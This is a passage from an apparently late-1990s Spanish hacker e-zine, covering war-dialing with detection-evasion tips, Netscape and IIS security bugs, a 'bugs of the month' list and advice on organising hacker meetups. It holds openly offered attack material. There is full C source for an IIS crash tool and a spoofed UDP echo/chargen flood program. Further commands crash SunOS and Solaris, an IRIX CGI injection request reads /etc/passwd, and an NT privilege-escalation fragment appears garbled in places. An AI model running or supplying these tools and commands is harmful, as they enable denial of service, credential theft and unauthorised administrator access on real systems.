-Consigue una guia telefonica en cd-rom, con un poco de habilidad se pueden
saltar los limites que tiene para la busqueda por numero y se puede hacer una 
especie de escaneo-off-line, es decir, comprobar a quien corresponde cada 
numero de telefono, sin necesidad de llamar.

-Los war-dialers son automaticos y trabajan solos, pero es recomendable estar
delante del ordenador cuando esten escaneando. Los modems, las PBX, los VMB,
son localizados automaticamente, (Si el war-dialer es lo suficientemente 
bueno) pero las cosas realmente interesantes solo se puden descubirir en
persona.

-Si no puedes permitirte el lujo de pasar un par de horas delante del
ordenador escaneando, y prefieres el escaneo automatico, usa un buen escaner
ya que la mayoria de los war-dialers solo detecta carriers y algunos ni
siquiera son capaces de diferenciar faxes de modems. El war-dialer ideal
tiene que ser capaz de detectar tonos (PBX y numeros especiales), voces 
grabadas (VMB), etc...

-Si escaneas desde cabina recuerda que en algunas cabinas estan capadas 
los numeros especiales, infovia (055), los numeros 900, algunas zonas, etc...
Normalmente se nota si la cabina no acepta un numero, pero otras veces lo
unico que pasa es que el telefono llamado comunica. Si estas escaneando una
zona y todos los telefonos comunican, entonces o algo se ha estropeado o la 
cabina esta haciendo algo raro.

-Ahora unas cuantas tecniquillas disponibles en el THC-SCAN para despistar a 
los ordenadores de telefonica:
-->Si tienes dos o mas lineas en tu casa puedes intentar alternar el escaneo 
por ambas lineas.
-->Usa distintas velocidades de marcado.
-->Cambia los tiempos de espera entre marcaciones.
-->Alterna entre marcado por tonos y por pulsos.  

-Si notas que tu linea empieza a comunicar mientras estas escaneando o la 
linea no da tono, seguramente has sido descubierto. Asi que dejalo y olvidate
del escaneo.

-Algunas PBX y algunos modems tienen sistemas anti-escaneo, en persona son
faciles de detectar, pero si escaneas automaticamente perderas estos 
sistemas. Algunas tecnicas que usan para evitar que los localices:
-->No cogen el telefono tras el primer tono, sino que tardan un numero 
variable de tonos para despistar.
-->Al conectar aparece una voz (grabada) y no el carrier. La voz suele decir
algo como "espere", "pulse asterisco", etc... (en ingles normalmente) de esta 
forma el carrier solo aparece tras unos segundo o despues de pulsar alguna 
tecla.
-->Algunos sistemas muy raros, tienen unos menus hablados (al estilo de un 
VMB) y entre las opciones suele estar la de hablar con una telefonista,
conectar por modem, etc...
-->En algunos casos al conectar no se oye nada, y hasta que no se pulsa 
alguna tecla o el modem no envia una determinada seคal, el carrier no aparece.
(AVISO--> Un numero que descuelga al primer tono y permanece en silencio 
puede ser tambien seคal de algo muy interesante. Si encontrais alguno 
hacedmelo saber :)


*Nota: La mayoria de estas medidas no hace indetectable el escaneo, pero hace
mas dificil su localizacion y hace mas dificil su identificacion por parte
de un tecnico.


Conclusion:
-----------

Aunque no hemos tenido noticias de que la policia haya detenido a nadie por
escanear lineas o por hacer llamadas extraคas, si hemos tenido noticias de 
amigos que han recibido un aviso (Como en las peliculas de la mafia :-) por 
escanear 900s o por llamar muchas veces a infovia el mismo dia, e incluso 
hemos oido rumores de cortes y bloqueos de linea durante escaneos. จSera 
accidental?, จSera premeditado?, no lo sabemos...
...pero lo que si sabemos seguro es que no queremos pasar a formar parte de
la lista negra de telefonica...


Despues de este articulo espero que mas o menos sepais lo que es un escaneo 
de lineas... Ahora toca pasar a la parte practica, y eso corre de vuestra 
cuenta.

Yo os recomendaria que buscaseis a algun hacker experimentado que ya haya
hecho escaneos en vuestra ciudad o que pregunteis antes de decidiros a hacer 
un escaneo por primera vez. Ademas de daros consejos muy utiles y de ayudaros 
a empezar seguramente os dira las zonas que ya ha escaneado y las zonas que 
son mejores para localizar carriers, asi os evitareis hacer lo que ya han 
hecho otros y ahorrareis tiempo.

Y nada mas, si creeis que se me ha olvidado algo en el articulo no os corteis 
y decidmelo. Mi direccion de correo es: el_duke1@hotmail.com

Saludos
                                                        El Duke de Sicilia





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 07. GIGANTES CON PIES DE BARRO                                            บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Si Internet es el centro de la informatica (y de lo que no lo es)
Microsoft y Netscape son los gigantes de ese mundo, empresas millonarias,
productos que alcanzan todos los rincones del mundo y de los que continuamente
se lanzan nuevas versiones, todos parecen seguir la estela de estos colosos.
Y sin embargo...pueden tener estos gigantes los pies de barro?. Es lo que
vamos a analizar en este articulo, leedlo y juzgad vosotros mismos.


Poco antes de finalizar el numero anterior empezo a oirse un fuerte rumor
acerca de que Netscape se habia dado por enterada del serio bug
de seguridad que afecta a sus navegadores y estaba trabajando contrarreloj
para dejar listo un patch.
Como recordareis el mes pasado plantee el problema que se presenta a la
hora de escribir sobre bugs entre la "actualidad del bug" y la "utilidad"
que tendra una vez difundido ampliamente.
En este caso dada la premura de tiempo para escribir el articulo y la
falta de garantias acerca de si Netscape realmente estaba al tanto del bug
aconsejo el no escribir nada.
Al final resulto que si, al parecer un tipo un poquillo ansiosete por
cobrar dinerillo puso en alerta a Netscape de la existencia del bug pero
pidio mas pasta que los estandar 1.000 pavos + camiseta que dan los chicos
de Mountain View, al final los ingenieros de Netscape lo encontraron ellos
solitos y no le han dado un duro al avaricioso (bien le esta por cabr*n)

Puede que alguno de vosotros se este preguntando จpero de que habla?.
Lo siento, a veces me olvido de que hay otras aficiones e intereses en la
vida aparte de estar al tanto de todos los fallos de seguridad :-(
El grano: Cualquier webmaster *puede* conseguir llevarse *cualquier*
archivo de un visitante de su pagina si se cumplen las condiciones:

a) El Webmaster conoce la ruta exacta del archivo
b) El visitante utiliza el Navigator

Ya, pero yo utilizo la version 2.x o el Communicator!
Da igual, el bug afecta al 2.x, 3.x, Communicator beta y Communicator final
4.0 (la 4.01 incorpora el patch)

Ya, pero yo no uso Win, trabajo desde Unix :-) !
Es independiente del sistema operativo, funciona en Mac, Unix, Windows...

Ya, pero yo estoy tras un firewall o proxy :-)) !
No importa en absoluto.

A joderse!. Tengo deshabilitado Java y Javascript!!
Tanto me da que me da lo mismo.

C*คooooo!. Si. Pero no os preocupeis los que hayais visitado nuestras paginas
por esta u otras 'perrerias', hay un concepto que se llama hospitalidad o
sea que tranquilos que no os hemos hurgado el disco duro. :-)
[Ni tampoco hemos hecho otras perrerias como "hidden mail" o similares]

Una vez el rumor corrio y se convirtio en aplastante comenzaron los
membrillos de siempre (esos que piensan que son geniales por que se enteran
de las cosas con 6 meses de retraso) a decir: จComo se hace?
Y venga a escribir JavaScript y venga a decirse unos a otros: "Esto no
funciona ni del carajo pero seguro que tiene que ser asi, sigue sin salir
pero seguro que este es el camino". Los hay membrillos, obcecados
completamente en una idea y sin ser capaces de tener vision de conjunto.
NOTA: Los usuarios del MierdaSoft Explorer 4.0 que no se me alboroten no sea
que se lleven alguna bonita sorpresa proximamente. };->

El caso es que, evidentemente, Netscape intento minimizar el asunto diciendo
que era un bug no de seguridad sino de privacidad (?!) puesto que al fin y
al cabo el "mal bicho" tenia que conocer la *ruta exacta* y cada sistema es
diferente, este planteamiento ha sido entusiastamente seguido por la prensa
del sector que ha "pasado de puntillas" sobre el asunto.

Todo eso es una bazofia porque el bug es grave, cada sistema es diferente
pero al acceder a un site el webmaster ya sabe que sistema utilizas y cuales
son las ubicaciones por defecto (que las has cambiado? mala suerte) de
archivos de registro, inicio, claves (que te parece si se lleva el
trumpet ini y se lleva tu login y password para infovia si eres espaคol, o
el secring.pgp, el autoexec.bat para ver lo que tienes en el computer..etc ,
etc, etc..)
Por supuesto si intenta llevarse grandes archivos puede notarse un mazo
(las prestaciones del modem parecerian caer en picado) pero para llevarse
unas cuantas configuraciones o archivos con datos "sensibles" ya esta bien.

El tema de patchs?. El Communicator 4.01 lo incorpora asi como las
versiones finales para Mac y Unix, el de 3.0 esta previsto que salga para
julio o asi (toy escribiendo esto en junio) y el de 2.x?. Un portavoz de
Netscape ha declarado lo siguiente, lo traduzco a castellano claro y
comprensible.

"2.x?. Los usuarios de 2.x que se vayan al peo, que hagan ya un upgrade que
es gratis y si no que se pudran. "

Mais claro agua. La misma politica de MercaSoft con el nuke a sistemas de
16 bits. Total a bajarse los 17Mb de Communicator pa ver paginas Web,
escribir correo y hacer tus paginillas practicamente la misma utilidad que
Bloc de Notas+Netscape 2.0.
Y por supuesto Microsoft no se queda atras, จquieres ver paginas Web? pues
bajate este bonito archivo de 25Mb que solo requiere 48Mb de Ram, Pentium
300, 4Gb de HD y la ultima beta de NT.
Ya os adivino la pregunta. จY todo eso como se hace?. A mi no me mireis, yo
no he sido el que ha dicho que INPUT=FILE y un frame "hidden" tienen algo
que ver, tampoco he comentado que el cebo es un falso link ni cosas
semejantes. Que me registren, pero que sea una tia cachas.
Claro que mientras tanto quiza eso de "Warn before submitting a form
insecurely" este mejor MARCADO. De nada.

Y mientras los chicos del navio se quedaban sin cenar en busca del bug en
un lugar de cuyo nombre no quiero acordarme los ingenieros de Microsoft
estaban a punto de enterarse de algo.. a las bravas.
Un poco de historia, por favor.


Microsoft presenta orgullosa su Windows NT 4.0 Server un sistema amigable
pero robusto, potente y estable, ideal para ser utilizado como servidor de
contenidos en Internet sobretodo si se utiliza en conjuncion con el
Internet Information Server (IIS) que en su version 3.0 MS regala a los
poseedores de NT.
Todo es bonito, el cielo es de color azul, los billetes fluyen hacia
Redmond cuando de repente ญcuidado! no son los galos irreductibles sino
un encapuchado llamado Todd Fast quien tumba el site entero de MSoft
solo con decirle a su browser. [Netscape 3.0 con Java 1.0.2]

Open Location: http://www.microsoft.com/? algo=******* (cadena irreproducible)

Y por arte de birlibirloque uno de los sites mas im-prezionantes del mundo
entero y conocido se derrumba, los usuarios que nada saben empiezan a
quejarse-cachondearse de MS por ese mensaje de "Obras y Upgrades" que los
mozos de Bill Gates colocan en su ventanuco como excusa para la casi
imposibilidad de acceder a su colapsado site, el terror cunde en casa-Bill.
ญTodos sus clientes que confian en Windows NT e IIS pueden ver sus sites
cerrados!. Basta que cualquier loco-gracioso-resentido-delincuente o que
se yo, se conecte a Internet, abra su browser y libre la fatidica instruccion

Open Location:http://www.loquesea.com/? algo=****** (cadena irreproducible)

Y yasta!. Y el site se viene abajo y adios zarandajas de seguridad,
pandemoniums de firewalls, protocolos y la madre que los trajo_a_todos_los_
sinvergenzas_llamados_asesores_de_seguridad.
Si seคor, ridiculo espantoso de Billy Company pero no solo suyo, ridiculo de
todos los payasetes, zascandiles, besugos y correveidiles que disfrazados
de "expertos" se lian a explicar como han puesto perimetros vallados,
deteccion de humo, sonido y presion, vigilancia armada, sistemas expertos,
cursos de formacion en seguridad ..etc.
(A pagar, a pagar que el mundo se va a acabar)

Pero seคores: Todo muy bonito y muy seguro, zi. Pero..ญญse han dejado la
puerta principal abierta!!. Que ya no es la primera vez, que hace poco nos
pasamos un par de meses tirando Wincomputers conectados a Inet (entre
nosotros mismos, nada grave oiga).

Recapitulemos, dos ultimos numeros de Saqueadores:
Como tirar cualquier ordenador que use Win y NetBios (casi na)
Como hurgar el disco duro del vecino Netscapero (poquillo mas complicao)
Como tirar un site entero con NT e IIS (y sin salir del browser)

Y luego hacen conferencias de seguridad. Que estafa, por Dios, que estafa.
Aprendan primero a atarse los cordones. Y ญojo al dato! que nadie se me
olvide de la promesa de arriba, el MSIE 4.0 nos va a hacer reir un rato
tambien, daremos tiempo al tiempo pero ya se hara correr la voz.

Y ya os adivino la pregunta. ;). จEso como se hace?. Lo siento, pero no
os puedo decir que de lo que se trata es de mandar al server una direccion
tipo CGI (con pares de nombre/valor y esas zarandajas) que este entre los 4k
y 8k de larga y que lo que hace cascar no es la direccion sino la _longitud_.
En cambio si puedo decir que "desatascar" el site es relativamente facil
siempre que algun "venado" no se dedique a "tirarlo" constantemente.
No seria prudente comentar que cada site requiere una cadena distinta y que
existe un programita en Java que va probando combinaciones automaticamente.
Por supuesto el programa que circula por Internet ha sido "retirado" de la
mayoria de los sites a ""peticion"" de Microsoft.

Y ya os adivino la pregunta?. Pero en Saqueadores lo habeis conseguido?
Pues.......... no.
Asi que lo que tenemos es un programita en C que hace lo mismo (al menos en
teoria) como ya sabeis C es nuestro "lenguaje oficial" :-))
Y como hoy estoy de buenas, aqui va el codigo fuente.


/* Este programa pretende ser una emulacion en C del programa
   IIServerSlayer desarrollado en Java por Todd Fast
   Esta testeado en Linux y compilado con gcc y glibc.
   Este programa es potencialmente peligroso
   Saqueadores no se responsabiliza de NADA.*/



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <signal.h>

int s;
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;

int open_sock(int sock, char *server, int port) {
  struct sockaddr_in blah;
  struct hostent *he;
  bzero((char *)&blah,sizeof(blah));
  blah.sin_family=AF_INET;
  blah.sin_port=htons(port);
  if ((he = gethostbyname(server)) != NULL) {
    bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
  }
  else {
    if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
      perror("gethostbyname()");
      return(2);
    }
  }
  if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
    perror("connect()");
    close(sock);
    return(3);
  }
  return 0;
}

char *generate_die_string(int lenght) {
  char letter='X';
  char *str_begin = "GET /?bye=",*str_end = " HTTP/1.0\r\n\r\n",*str;
  int i;
  str = (char *)malloc(lenght+strlen(str_end)+strlen(str_begin)+1);
  strcpy(str,str_begin);
  for(i=strlen(str_begin);i<lenght+strlen(str_begin);i++) str[i] = letter;
  str[i]=0;
  strcat(str,str_end);
  return (char *)str;
}

void IIServerSlayer(char *target,int lenght,int port,int flags) {
  char buff[2],header[512],*IIS_string = "Server: Microsoft-IIS/3.0";
  char *IIS_patch = "Bad Request";
  int count = 0,return_status;
  if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
    perror("socket()");
    exit(1);
  }
  if((return_status = open_sock(s,target,port))) exit(return_status);
  if(lenght) printf("Inspector Lucas trabajando = %d a %s\n",lenght,target);
  else printf("Averiguando si %s es un server Microsoft-IIS/3.0\n"
              ,target);
  send(s,generate_die_string(lenght),strlen(generate_die_string(lenght)),0);
  printf("Esperando respuesta de %s\n",target);
  buff[1]=0;
  while(recv(s,buff,1,0) == 1) {
    if(flags & 1) printf("%s",buff);
    else if(!div(count,50).rem) printf(".");
    if(count < 511) header[count]=buff[0];
    count++;
  }
  printf("\n");
  header[511]=0;
  if(strstr(header,IIS_string) == NULL && lenght == 0) {
    printf("Este servidor no es un Microsoft-IIS/3.0\n");
    if(!(flags & 2)) exit(0);
  }
  else if(!lenght) printf("Ok, este si es un servidor Microsoft-IIS/3.0\n");
  if(strstr(header,IIS_patch) != NULL) {
    printf("Este IIS/3.0 web server esta protegido contra el exploit\n");
    if(!(flags & 2)) exit(0);
  }
  close(s);
}

void main(int argc,char **argv)
{
  int i = 1,port = 80,lenght = 8180,flags = 0,param = 0,pid;
  if (argc < 2 ) {
    printf("Uso: %s [-v] [-f] <target> [string_lenght] [port]\n",argv[0]);
    printf("[-v] = verbose mode para ver la respuesta del server\n");
    printf("[-f] = fuerza a ejecutarse el exploit\n");
    exit(0);
  }
  for(i=1;i<argc;i++) {
    if(!strcmp(argv[i],"-v")) { param++; flags |= 1; }
    if(!strcmp(argv[i],"-f")) { param++; flags |= 2; }
  }
  if(argc > param+2) lenght = atoi(argv[param+2]);
  if(argc > param+3) port = atoi(argv[param+3]);
  for(i=0;i<3;i++,lenght++) {
    if(i) IIServerSlayer(argv[param+1],lenght,port,flags);
    else IIServerSlayer(argv[param+1],0,port,flags);
    if(i == 1 || i == 0) lenght--;
  }
  if((pid = fork())) {
    if(pid == -1) {
      perror("No puedorrll\n");
      exit(-1);
    }
    usleep(60000000); /* Espera, pecador*/
    kill(pid,SIGTERM);
  }
  else {
    IIServerSlayer(argv[param+1],lenght,port,flags);
    printf("Cachis, %s todavia vive\n",argv[param+1]);
  }
  exit(0);
}


Por supuesto la cosa no se queda aqui, en el mes que ha pasado desde que
escribi esto hasta que se ha lanzado la revista han aparecido muchos mas
"fallos" (o son caracteristicas planeadas?) pero ya hablaremos de ello en
otro momento. No os lieis la cabeza que por los mensajes que he recibido
parece que hay gente que va con una caraja considerable. :DDD

Eso es todo amigos.





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 14. LOS BUGS DEL MES                                                      บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Para: Passwd+ o NPasswd bajo UNIX(r) System V Release 4.0
Tena: Login
Patch: Fijado en nuevas versiones
Credits: El Hombre de Negro <hell2@hotmail.com>

Existe un bug en Passwd+ o Npasswd que permite el acceso sin clave cuando
la validez de la anterior ha expirado.
Si el programa detecta que el usuario que quiere entrar (sabe quien es
despues de poner el login) tiene el mismo password demasiado tiempo, le pide
inmediatamente que lo cambie ญญญSIN PEDIR EL PASSWORD ANTIGUO!!!, saldria
esto:


        UNIX(r) System V Release 4.0 (good religious site)

        login: priest
        Sorry Passwd has expired
        Change:




Descripcion y Notas:
Es comun que algunos administradores de sistemas UNIX, obliguen a los
usuarios a cambiar cada cierto tiempo de password, para esto algunos utilizan
los programas Passwd+ o NPasswd, el bug en estos programas es para que los
programadores fueran encarcelados.
Asi que ya sabes, encontrarse esto por casualidad es muy improbable, por lo
que tendras que apaคartelas haciendo Ingenieria Social en el IRC, sacar la
informacion suficiente no es nada dificil.



Para: SunOs 4.1.x
Tema: Crash
Patch: Manual

        cp -p /vmunix /dev/audioctl
        rcp /etc/motd you@some.host:/dev/audio

Descripcion y Notas:
La primera instruccion cuelga el ordenador y hace necesario un reset, la
segunda hace lo mismo pero sin dejar "esa molesta huella" en el log del
sistema. Esta segunda instruccion funciona con cualquier fichero, de hecho
si escojes un fichero .au ญtocara el sonido y despues colgara el ordenador!




Para: IRIX 6.2       
Tema: Ejecutar comandos de manera remota
Patch: Manual

         telnet target.host.com 80
         GET /cgi-bin/handler/taluego_Lucas;cat   /etc/passwd|?data=Download
         HTTP/1.0

Descripcion y Notas:
El cgi-bin/handler en los sistemas IRIX permite la lectura y escritura de
ficheros sin embargo existe un bug que da paso a la ejecucion remota de
comandos. El sistema intentara abrir el fichero (taluego_Lucas) y si no
existe dara un mensaje de error para a continuacion ญejecutar el comando
que sigue!. Muy importante, el espacio entre el comando cat y su argumento es
un *tabulador* (TAB), no se admiten espacios asi que aunque podeis poner
otro comando que no sea cat no podreis poner ningun comando que requiera
espacios.
En IRIX 6.3 se intento arreglar esto pero lo unico que se consiguio fue
que el formato del bug pase a ser:

        telnet target.host.com 80
        GET /cgi-bin/handler/whatever;cat       /etc/passwd|    ?data=Download
        HTTP/1.0

Con un nuevo TAB para "engaคar" al script PERL.




Para: Inetd - Redes
Tema: The network "food fight"
Patch: Manual


*/

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>

struct sockaddr addrfrom;
struct sockaddr addrto;
int s;
u_char outpack[65536];
struct iphdr *ip;
struct udphdr *udp;



main(int argc, char **argv) {
    struct sockaddr_in *from;
    struct sockaddr_in *to;
    struct protoent *proto;
    int i;
    char *src,*dest;
    int srcp, destp;
    int packetsize,datasize;


 fprintf(stderr,"Pingpong Demo. Cortesia de Saqueadores\n");
 fprintf(stderr,"<<< 'EL MAL USO DE ESTE PROGRAMA ES PELIGROSO >>>\n\n");
 if (argc!=5) {
    fprintf(stderr,"mal arg.\nUso: src_addr src_port dst_addr dst_port\n");
    fprintf(stderr,"src_addr y dst_addr en forma IP (xxx.xxx.xxx.xxx)\n");
    fprintf(stderr,"A menudo funciona con 127.0.0.1 como src_addr !\n");
    exit(2);
    }
    src=argv[1];
    srcp=atoi(argv[2]);
    dest=argv[3];
    destp=atoi(argv[4]);

    if (!(proto = getprotobyname("raw"))) {
        perror("getprotobyname(raw)");
        exit(2);
    }
    /* "raw" debe ser 255 */
    if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0) {
        perror("socket");
        exit(2);
    }

    memset(&addrfrom, 0, sizeof(struct sockaddr));
    from = (struct sockaddr_in *)&addrfrom;
    from->sin_family = AF_INET;
    from->sin_port=htons(srcp);
    if (!inet_aton(src, &from->sin_addr)) {
        fprintf(stderr,"Direccion incorrecta para 'from': %s\n",src);
        exit(2);
    }

    memset(&addrto, 0, sizeof(struct sockaddr));
    to = (struct sockaddr_in *)&addrto;
    to->sin_family = AF_INET;
    to->sin_port=htons(destp);
    if (!inet_aton(dest, &to->sin_addr)) {
        fprintf(stderr,"Direccion incorrecta para 'to': %s\n",dest);
        exit(2);
    }

    packetsize=0;

    /* Construyendo el paquete UDP */

    ip=(struct iphdr *)outpack;
    ip->version=4;      /* IPv4 */
    ip->ihl=5;          /* Cabecera IP de 5 palabras */
    ip->tos=0;
    ip->id=0;
    ip->frag_off=0;
    ip->ttl=0x40;
    if (!(proto = getprotobyname("udp"))) {
        perror("getprotobyname(udp)");
        exit(2);
    }
    /* "udp" debe ser 17 */
    ip->protocol=proto->p_proto;   /* udp */
    ip->check=0;    /* sera automaticamente corrompida por el kernel */
    ip->saddr=from->sin_addr.s_addr;
    ip->daddr=to->sin_addr.s_addr;
    /* end of ip header */
    packetsize+=ip->ihl<<2;
    /* udp header */
    udp=(struct udphdr *)((int)outpack + (int)(ip->ihl<<2));
    udp->source=htons(srcp);
    udp->dest=htons(destp);
    udp->check=0;   /* ignora checksum */
    packetsize+=sizeof(struct udphdr);
    /* Final de la cabecera udp */
    /* Aคade datos udp aqui si quieres */
    for (datasize=0;datasize<8;datasize++) {
        outpack[packetsize+datasize]='A'+datasize;
    }
    packetsize+=datasize;
    udp->len=htons(sizeof(struct udphdr)+datasize);
    ip->tot_len=htons(packetsize);
    if (sendto(s, (char *)outpack, packetsize, 0, &addrto,
       sizeof(struct sockaddr))==-1)
       {
        perror("sendto");
        exit(2);
    }
    printf("Paquete largado!\n");
    close(s);
    printf("Fin\n");
    exit(0);
}


Descripcion y Notas:
Pues vamos a ver lo que hemos hecho!. Un tema recurrente en las redes es
el de la "vampirizacion" de recursos, el programa de arriba va a enviar un
paquete que a su vez va a generar una respuesta que a su vez va a generar
un paquete que a su vez...En poco tiempo el ancho de banda puede desaparecer
y el procesador dedicar todo su tiempo a tareas inutiles debido al "pingpong"
que genera el programa.
Como inetd no verifica el origen de los puertos como "chargen", "time",
"echo"..etc el truco consiste en hacer aparecer el origen del paquete en
uno de esos puertos y dirigido a uno de esos puertos.
El funcionamiento del programa es simple, especificad la direccion y puerto
escogidos tanto de origen como de destino y contemplad el resultado, puede
ir desde el cuelgue al practico monopolio de la CPU.

Existen muchos otros aproximamientos a este tema probad por ejemplo a
enviar un paquete UDP al puerto "chargen" de un sistema haciendo un spoof
del origen como si fuese el puerto "echo" en la direccion BROADCAST de
esa intranet.
Quiza este parrafo me ha quedado un poco liado :-? pero es mas sencillo
de lo que parece.
Destino: Puerto "chargen" machine.com
Origen (falso): Puerto "echo" IP xxx.xxx.xxx.xxx (la que corresponda al
BROADCAST de esa intranet)
Como ya hemos dicho el 'spoof' en este caso es relativamente trivial puesto
que inetd no comprueba el origen cuando se trata de servicios UDP sencillos.
El resultado es similar o peor al del programa listado.



Para: Solaris (todas las versiones?)
Tema: Ping of Death
Patch: Server de Sun, proximas versiones lo incluiran en el kernel.

  ping -sv -i 127.0.0.1 224.0.0.1

Descripcion y Notas:

Causa el cuelgue de la maquina, las razones son algo complejas pero el
resultado de lo mas sencillo. Reboot needed :->.


Y eso es todo.. ah, no!. Se me olvidaba el de NT


Para: Windows NT 4.0 con Service Pack 3
Tema: 'Root Shell'
Patch: En preparacion
Credits: Constin Raiu


Function  ChangeNtGlobalFlag :

BOOL ChangeNtGlobalFlag(DWORD pNtGlobalFlag)
{
        DWORD callnumber = 0x3;         //NtAddAtom
        DWORD stack[32] ;
        int i;
        DWORD handle=0;
        CHAR string[255];


        if(!pNtGlobalFlag) return 0;

        stack[0] = (DWORD)string;
        stack[1] = (DWORD)&handle;      //pNtGlobalFlag;

        for(i=0;i ? 0x100;i++)
        {
                sprintf(string,"NT now cracking... pass %d",i);

                if(handle & 0xf00){
                        stack[1] = (DWORD)pNtGlobalFlag+1;
                }

                __asm{
                        mov eax, callnumber;
                        mov edx, stack;
                        lea edx,dword ptr [stack];
                        int 0x2e;
                }

                if( stack[1] == pNtGlobalFlag+1) break;
        }


        return TRUE;
}


Descripcion y Notas:

El programa de arriba permite que cualquier usuario de un sistema NT
(4.0+SP 3) adquiera _privilegios de administrador_ en la red.
Uso: GetAdmin <nombre de cuenta>, si no se especifica el nombre de cuenta,
se usara la cuenta actual.
NOTA: La cuenta de guest *no sirve* para estos propositos.

Eso es todo, si teneis algun bug que valga la pena y quereis compartirlo
en la seccion de Colaboraciones y Peticiones viene a quien teneis que
escribir.


                                                                                                                                                                
                                                                  

ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 09. REUNIONES DEL UNDERGROUND                                             บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


 
[Introduccion]

Ahora que estamos en verano y la mayoria estamos de vacaciones, es la epoca
ideal para organizar una quedada. Ademas es una de las pocas ocasiones en las
que muchos de los que vivimos lejos de las grandes ciudades nos reunimos en 
las zonas de playa.

Por fin podreis conocer en persona a los grandes gurus del hacking de vuestra
ciudad, o conocer al tio ese tan simpatico del irc que controla tanto de los 
unix y al que tenias ganas de ver en persona. 


[Problemas]

Esto de organizar una quedada parece algo facil y de lo mas normal. Lo 
hacemos casi todos los fines de semana con los amigos. Pero... estamos
hablando de una quedada de hackers, ญsi!, de hackers... esa gente tan rara
que nunca sale a la calle, que lleva gabardina y gafas oscuras, y que esta
constantemente preocupandose por su anonimato hasta alcanzar cotas de 
paranoia aguda. :)

En realidad no es tan dificil, pero cuesta bastante reunir a un grupo mas
o menos amplio de hackers y que no se mosqueen. Y tiene que ser amplio 
porque si fuesen pocos la cosa seria aun mas mosqueante. Lo ideal es un grupo
de 10-20 personas que entiendan del tema y que esten interesados en hablar.

Aqui empiezan los problemas... จComo encuentro yo 10 hackers en mi ciudad, si
yo debo ser el unico? No te preocupes a menos que tu ciudad sea muy pequeคa
habra un buen grupo de hackers en la zona. Parece que esto del Hacking en 
Espaคa no se lleva pero es mentira, si sabes donde buscar, en lo mas profundo
del underground de tu ciudad encontraras muchos hackers, algunos incluso
buenos...

Esto lo digo en serio, hay muchos mas hackers de lo que se piensa y mucho
mejores de lo que se cree, es cuestion de moverse y hablar con la gente
adecuada.

El resto de los problemas es mas sencillo de solucionar, y son los tipicos
problemas de organizar una reunion:
-Tienes que ponerte en contacto con la gente y quedar con ellos en un sitio.
-Buscar un sitio para quedar.
-Poner de acuerdo a todos respecto a la hora y el dia. (Normalmente un fin
de semana o... ญญvacaciones!!)


[Empezamos a trabajar]

Recomendaciones para empezar:
-Como organizarlo todo. El problema basico... Lo mejor es que se encargue
una sola persona de quedar con todos, de esta manera no habra confusiones y
todo el mundo sabra a quien acudir para preguntar. El problema ahora es
quien se encarga... Lo mejor es que lo haga alguien que no tenga mucho que
temer por su anonimato.
-La gente no se fia y piensa que su anonimato se mantendra. Esto es lo mas
dificil de garantizar... Pero en realidad tampoco es tan grave. En una 
reunion de este estilo lo unico que van a saber de ti, es tu aspecto fisico
y tu apodo (que incluso puedes cambiar) y nadie va a saber tu nombre real ni
de donde eres por verte la cara.
-Encontrar un sitio. Pues lo mas sencillo del mundo quedais en una terraza,
una bar, o mucho mejor... un cafe internet, que estara lleno de informaticos
y mejor aun, estara lleno de ordenadores.
-Como reconocer a la gente. Pues tambien muy facil :) es que nunca habeis
tenido una cita a ciegas. Describis la ropa que vais a llevar o lo tipico
de "llevare un clavel en el ojal", y ya esta. X-D
-De que hablar. no os preocupeis del tema, que al final saldra algo y
seguramente os falte tiempo para terminar...


[A quien invitar]

Bueno, ahora que ya sabemos como montar la cosa, la cuestion es encontrar a 
gente... este es otro de los grandes problemas. La comunidad hacker no es
demasiado estable y carece de medios de comunicacion fijos. Algunos diran
que existen grupos de news por ejemplo y canales de irc... si efectivamente,
pero resulta que ese tipo de canales atraen mas a lamers y novatos que a
verdaderos hackers. Por eso si se quiere organizar una reunion seria y que
no se presenten 20 piratillas deseosos de vender cd's piratas lo mejor es
seleccionar bien a los invitados.

Lo ideal seria hablar con ellos directamente y comprobar su grado de interes. 
Esto tambien es dificil por las propias caracterisiticas de los hackers... 
pero se puede arreglar. 

Con un par de preguntas se reconoce si la persona con la que estas hablando
puede tener algo interesante que contarte o no. (Pero ojo, no desprecies a 
nadie porque puede que dentro de unos aคos se haga un hacker de elite. En 
este mundillo se aprende muy rapidamente.)


[Donde organizarlo]

Lugares idoneos para organizar una reunion:
-Mediante un BBS, este es el metodo ideal. A las bbs suele llamar gente ya 
acostumbrada a la movida informatica, es facil encontrar hackers y la mayor 
ventaja, la mayoria de la gente es de tu misma ciudad. En los grupos de 
discusion de hacking de cualquier bbs podeis montar facilmente una reunion.
-Por irc, este metodo tambien sirve pero necesita un conocimiento previo de 
la gente que se quiere invitar, ya que o estas todo el dia en el irc o 
siempre habra alguien que se conecte a una hora en la que no estes. Los 
canales ideales para organizar una quedada de este estilo, son primero los
canales de hack (#hack, #phreak, etc...) En estos canales localizais a la 
gente que sea de vuestra zona y que esta interesada en la quedada. Otros 
canales tambien recomendables para buscar gente son los canales de vuestra 
ciudad (#madrid, #zaragoza, etc...) aunque nunca se sabe lo que se puede 
encontrar en estos canales. :)
-En algun grupo de news especializado, y no me refiero a es.comp.lamers...
ejem... perdon, no me refiero a es.comp.hackers sino a algun grupo poco
conocido por los niคos del warez en algun servidor de noticias decente y
en el que se reuna un buen grupo de hackers.


[Conclusion]
